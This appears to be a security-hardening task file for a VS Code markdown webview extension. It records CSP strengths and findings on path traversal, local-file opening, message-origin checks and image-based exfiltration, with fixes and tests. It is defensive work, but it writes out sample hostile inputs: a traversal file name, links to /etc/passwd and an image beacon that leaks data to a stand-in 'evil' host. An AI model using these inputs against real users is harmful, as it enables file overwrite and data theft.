# Task 148 — Webview security hardening (path containment + defense-in-depth)

> **Status:** 📋 TODO — created 2026-06-24 from a security review of the webview attack surface
> (untrusted `.md` → render / host commands). Security.
> **Source:** architecture review (2026-06-24).
> **Value / Risk:** 🟢 closes two real path/file sinks + documents the accepted CSP tradeoffs / low —
> input validation + a CSP comment, no behavioural change for legitimate use.

## Threat model
A `.md` file is semi-trusted (VS Code Workspace Trust). The webview renders its content; some actions
(link click, image paste) post messages to the extension host, which performs file/command operations.
The review traced: CSP, every `innerHTML` sink, `eval`/WASM, host message handlers, and exfil channels.

## What's already strong (do NOT regress)
- **CSP baseline:** `default-src 'none'`, `object-src 'none'`, `frame-src 'none'`, `base-uri` locked
  (`src/html-builder.ts:40-49`).
- **`script-src` has a nonce and NO `'unsafe-inline'`** — this is load-bearing: it neutralizes every
  `innerHTML` sink (`custom-diagrams.ts:245/327` `svgStr`, `stream-render.ts:99`,
  `wysiwyg-code-highlight.ts:243`). A `<script>` or `onload=` injected via malicious diagram source
  won't execute. This is what makes the `innerHTML` usage acceptable.
- **No `eval`/`new Function` on untrusted content** (verified across `media-src/src`).
- **`connect-src` has no `https:`** → fetch/XHR/WebSocket exfil is blocked even when remote images are
  allowed. Good layering.
- **Wikilinks** resolve by key against a root-contained cache (`onOpenWikilink`), not raw path-join.

## Findings → work items (by severity)

### 1. 🟠 Path-traversal file WRITE in `onUpload`
`extension.ts:1014`: `fs.writeFile(Uri.file(NodePath.join(assetsFolder, file.name)), content)`.
`file.name` comes from the webview message and is **not sanitized** — no `basename`, no `..` strip, no
containment check. `file.name = "../../../<somewhere>"` escapes `assetsFolder` → arbitrary write.
`ensureCanWriteFiles` only gates *whether* writing is allowed (untitled/remote), not the path.
- **Fix:** `NodePath.basename(file.name)` (drop any directory component) AND assert the resolved
  target stays under `assetsFolder` (`resolved.startsWith(assetsFolder + sep)`); reject otherwise.
  Also reject empty/`.`/`..` names.

### 2. 🟠 Arbitrary local-file open via an untrusted link
`extension.ts:1040-1041`: the non-http branch does `NodePath.resolve(dirname(activeFsPath), href)` →
`vscode.open` with no workspace/doc-dir containment. `[x](/etc/passwd)` or `[x](../../../secret)`
opens any file on disk in the editor on click (information disclosure, not code-exec).
- **Fix:** contain the resolved target to the document dir / workspace; for out-of-scope targets,
  either refuse or confirm with the user. Keep the `^https?:` → `openExternal` branch as-is (it's the
  only branch that `Uri.parse`s the raw href, and it's correctly scheme-gated).

### 3. ⚪ Webview message handler doesn't validate `e.origin`/`e.source`
`media-src/src/main.ts:1312`: `messageHandlers[msg?.command]?.(msg)` runs on any `message` event.
Low risk given `frame-src 'none'` + no `unsafe-inline` script, but an origin check is cheap
defense-in-depth.
- **Fix:** verify `e.origin` is the expected `vscode-webview://…` origin before dispatching.

### 4. ⚪ Document why `unsafe-eval` is in the CSP
`script-src … 'unsafe-eval'` (`html-builder.ts:46`) is required by the **D2 WASM** bootstrap
(`wasm_exec.js` uses `Function()`); we verified nothing evals markdown. It's an accepted necessity,
but undocumented at the CSP site → risk of someone widening it blindly later.
- **Fix:** a comment at the directive naming the single consumer (WASM); evaluate whether
  `'wasm-unsafe-eval'` alone suffices in the VS Code webview (narrower) with `'unsafe-eval'` as the
  fallback — verify in the real webview, don't assume.

### 5. ⚪ `img-src https:` under `allowRemoteImages` is the one exfil channel — already opt-in
A remote image (`![](https://evil/?leak=…)`) is a tracking/exfil beacon, but only when
`vmarkd.image.allowRemoteImages` is on (default off) — correct design. No change; recorded so the
default is never silently flipped. (`connect-src` stays remote-free regardless — keep it that way.)

## Tests (per AGENTS)
- **unit** (host) — `onUpload` rejects/sanitizes `file.name` with `..`, absolute, and empty values
  (asserts the write target stays under `assetsFolder`); `onOpenLink` refuses/contains an
  out-of-workspace `href`.
- **unit** (webview) — the message handler ignores a `message` event from an unexpected origin (#3).

## See also
- `src/html-builder.ts` (CSP), `src/extension.ts` (`onUpload`, `onOpenLink`, `onOpenWikilink`,
  `ensureCanWriteFiles`), `media-src/src/main.ts:1312` (message handler), `media-src/src/custom-diagrams.ts`
  (the `innerHTML` SVG sinks the no-`unsafe-inline` CSP protects).
- Memory: "innerHTML Sinks in Renderers" (post-process SVG, not raw markdown). Task 67 (image-trust
  gate / `allowRemoteImages`), task 87 (`object-src 'none'` killed remote PlantUML).
